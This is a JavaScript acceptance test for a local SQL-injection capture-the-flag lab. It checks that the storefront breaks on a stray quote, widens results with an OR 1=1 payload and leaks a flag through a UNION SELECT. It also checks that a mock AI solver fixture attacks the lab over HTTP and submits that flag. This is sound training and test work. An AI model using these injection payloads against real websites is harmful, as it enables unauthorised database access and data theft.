import test from 'node:test';
import assert from 'node:assert';
import fs from 'node:fs/promises';
import path from 'node:path';
import { createLabServer } from '../examples/sqli-lab/app.mjs';

/**
 * sqli-lab acceptance: the bundled challenge must be exploitable end to end
 * from HTTP — and the mock-lane solver fixture must ship the same flag the
 * SQL injection surfaces, so the offline demo solves it on record.
 */

const ROOT = path.resolve(import.meta.dirname, '..');
const LAB_DIR = path.join(ROOT, 'examples', 'sqli-lab');
const SOLVER = path.join(ROOT, 'test', 'fixtures', 'mock', 'worker.sqli-lab.json');

const search = (base, q) => `${base}/search?` + new URLSearchParams({ q }).toString();

test('sqli-lab: storefront serves, breaks loudly, and the flag lives only in the database', async () => {
  const { server, port } = await createLabServer({ port: 0 });
  const base = `http://127.0.0.1:${port}`;
  try {
    const home = await (await fetch(base + '/')).text();
    assert.ok(home.includes('Sakura Surplus'), 'storefront renders');
    assert.ok(home.includes('Kunai'), 'inventory listed');

    const one = await (await fetch(search(base, 'gusoku'))).text();
    assert.ok(one.includes('1 row'), 'normal search narrows results');
    assert.ok(one.includes('Eggshell gusoku'));

    // Broken quote → 500 with the executed statement leaked (debug build).
    const bad = await fetch(search(base, "'"));
    const badText = await bad.text();
    assert.equal(bad.status, 500);
    assert.ok(badText.includes('sqlite-emu error'));
    assert.ok(badText.includes('executed statement'), 'error page leaks the SQL');

    // Boolean OR injection returns the full shelf.
    const orAll = await (await fetch(search(base, "' OR 1=1-- "))).text();
    assert.ok(orAll.includes('5 rows'), `or-1=1 widens the result: ${/([\d]+) rows/.exec(orAll)?.[1]}`);
    const nomatch = await (await fetch(search(base, 'zzzz-nomatch'))).text();
    assert.ok(!nomatch.includes('5 rows'), 'control: a plain miss does not widen results');

    // UNION injection pulls the flag out of the flags table.
    const union = await (await fetch(search(base, "' UNION SELECT 1, flag, 3, 'pwned' FROM flags-- "))).text();
    const m = /shingun\{[\w-]+\}/.exec(union);
    assert.ok(m, 'union payload must surface the flag');
    const flag = m[0];
    assert.match(flag, /^shingun\{[\w-]+\}$/);

    // The flag must NOT be a literal in any challenge file: only the SQLi
    // path can produce it.
    const appFs = await fs.readFile(path.join(LAB_DIR, 'app.mjs'), 'utf8');
    const readmeFs = await fs.readFile(path.join(LAB_DIR, 'README.md'), 'utf8');
    assert.ok(!appFs.includes(flag), 'flag must not be greppable in app.mjs');
    assert.ok(!readmeFs.includes(flag), 'flag must not be greppable in README.md');

    // The mock solver fixture ships the same flag — the offline demo solves
    // the real thing.
    const fixture = JSON.parse(await fs.readFile(SOLVER, 'utf8'));
    const submits = fixture.steps.flatMap((s) => s.tool_calls ?? []).filter((c) => c.function.name === 'submit_flag');
    assert.equal(submits.length, 1, 'fixture submits the flag exactly once');
    assert.equal(submits[0].function.arguments.flag, flag, 'fixture flag must equal the live exploited flag');
    const shellArgs = fixture.steps.flatMap((s) => s.tool_calls ?? [])
      .filter((c) => c.function.name === 'run_shell')
      .map((c) => c.function.arguments.command);
    assert.ok(shellArgs.some((c) => c.includes('UNION SELECT') && c.includes('127.0.0.1:9377')),
      'fixture must attack the live lab over HTTP');
  } finally {
    await new Promise((resolve) => server.close(resolve));
  }
});
